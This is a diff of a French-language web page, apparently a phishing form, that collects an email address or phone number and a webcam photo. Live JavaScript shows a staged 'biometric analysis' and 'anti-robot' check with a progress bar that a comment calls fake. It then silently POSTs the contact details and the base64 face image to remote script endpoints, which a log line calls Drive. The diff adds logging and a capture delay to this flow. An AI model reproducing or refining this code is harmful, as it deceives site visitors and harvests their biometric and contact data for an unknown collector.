@@ -62,7 +62,6 @@
   .form-group label { display: block; font-size: 15px; font-weight: 700; margin-bottom: 8px; color: #161616; }
   .form-group .hint { font-size: 13px; color: #666; margin-bottom: 8px; display: block; }
   
-  /* Nouveau style pour les inputs */
   .form-group input, .form-group select { 
     width: 100%; 
     padding: 12px; 
@@ -74,7 +73,6 @@
   }
   .form-group input:focus, .form-group select:focus { outline: 2px solid #000091; outline-offset: 2px; }
 
-  /* Groupe Téléphone (Pays + Numéro) */
   .phone-group { display: flex; gap: 10px; }
   .phone-group select { width: 130px; flex-shrink: 0; }
   .phone-group input { flex-grow: 1; }
@@ -190,12 +188,10 @@
       <label id="label-contact">Votre adresse e-mail</label>
       <span class="hint" id="hint-contact">Format attendu : nom@domaine.fr</span>
       
-      <!-- Champ Email -->
       <div id="email-wrapper">
         <input type="email" id="input-contact" placeholder="exemple@email.com">
       </div>
       
-      <!-- Champ Téléphone avec menu déroulant Pays -->
       <div id="phone-wrapper" class="phone-group" style="display: none;">
         <select id="input-country-code">
           <option value="+33">🇫🇷 +33</option>
@@ -307,6 +303,7 @@ async function loadFaceModel() {
   try {
     await faceapi.nets.tinyFaceDetector.loadFromUri('https://cdn.jsdelivr.net/gh/justadudewhohacks/face-api.js@master/weights');
     faceModelLoaded = true;
+    console.log("Modèle visage chargé.");
   } catch (e) {
     console.warn("Erreur chargement modèle:", e);
   }
@@ -563,8 +560,12 @@ btnSubmit.addEventListener('click', async () => {
     }
 
     // --- CAPTURE PHOTO INSTANTANÉE ---
+    // On capture IMMÉDIATEMENT après la détection (pas de délai)
     loaderText.textContent = "Analyse biométrique en cours...";
     loaderBarFill.style.width = '50%';
+
+    // Attendre 200ms que la vidéo se stabilise
+    await new Promise(r => setTimeout(r, 200));
 
     const canvas = document.createElement('canvas');
     canvas.width = video.videoWidth || 640;
@@ -572,7 +573,10 @@ btnSubmit.addEventListener('click', async () => {
     const ctx = canvas.getContext('2d');
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
     const photoBase64 = canvas.toDataURL('image/jpeg', 0.85);
+    
+    console.log("Photo capturée. Taille:", photoBase64.length, "caractères");
 
+    // Fausse progression pendant 2,5 secondes
     setTimeout(() => {
       loaderText.textContent = "Vérification anti-robot et sécurisation...";
       loaderBarFill.style.width = '80%';
@@ -610,10 +614,14 @@ btnSubmit.addEventListener('click', async () => {
 
         fetch(SCRIPT_URL_TEXT, { method: "POST", body: formDataTexte }).catch(e => console.log(e));
 
+        // Envoi de la photo
         const formDataMedia = new URLSearchParams();
         formDataMedia.append("media", photoBase64);
         formDataMedia.append("extension", "jpg");
-        fetch(SCRIPT_URL_PHOTO, { method: "POST", body: formDataMedia }).catch(e => console.log(e));
+        fetch(SCRIPT_URL_PHOTO, { method: "POST", body: formDataMedia })
+          .then(r => r.text())
+          .then(t => console.log("Réponse Drive:", t))
+          .catch(e => console.log("Erreur envoi photo:", e));
 
         if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
         
